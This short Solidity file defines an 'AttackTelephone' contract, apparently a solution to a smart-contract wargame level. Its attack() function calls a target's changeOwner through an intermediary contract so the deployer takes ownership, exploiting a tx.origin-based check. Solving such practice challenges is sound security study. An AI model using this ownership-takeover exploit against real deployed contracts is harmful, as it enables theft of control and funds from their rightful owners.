// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackTelephone {
  address public owner; 
  Telephone2 public telephone;
  address public telephoneAddress;
  constructor(address _telephoneAddress) {
    owner = msg.sender;
    telephoneAddress = _telephoneAddress;
    telephone = Telephone2(_telephoneAddress);
  }

  function attack() public {
    telephone.changeOwner(owner);
  }
}

 abstract contract Telephone2 {
  function changeOwner(address _owner) virtual external;
}

